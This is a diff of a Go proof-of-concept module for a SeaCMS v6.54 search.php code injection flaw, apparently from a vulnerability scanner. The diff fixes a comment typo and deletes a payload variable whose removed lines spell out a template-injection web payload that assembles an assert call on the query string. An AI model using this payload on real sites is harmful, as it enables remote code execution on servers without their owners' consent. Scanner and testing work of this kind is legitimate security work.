@@ -9,17 +9,6 @@ import (
 	"time"
 )
 
-var payload = `
-	"searchtype":"5",
-	"searchword":"{if{searchpage:year}",
-	"year":":as{searchpage:area}}",
-	"area":"s{searchpage:letter}",
-	"letter":"ert{searchpage:lang}",
-	"yuyan":"($_SE{searchpage:jq}",
-	"jq":"RVER{searchpage:ver}",
-	"ver":"[QUERY_STRING]));/*"
-`
-
 // SeaCMSv654 search.php code injection.
 type SeaCMSv654 struct {
 	target  string
@@ -31,12 +20,12 @@ func NewSeaCMSv654() *SeaCMSv654 {
 	return &SeaCMSv654{}
 }
 
-// Report impletements POC interface.
+// Report implements POC interface.
 func (s *SeaCMSv654) Report() interface{} {
 	return s.Existed
 }
 
-// Run impletements POC interface.
+// Run implements POC interface.
 func (s *SeaCMSv654) Run(target string) {
 	s.target = target
 	s.check()
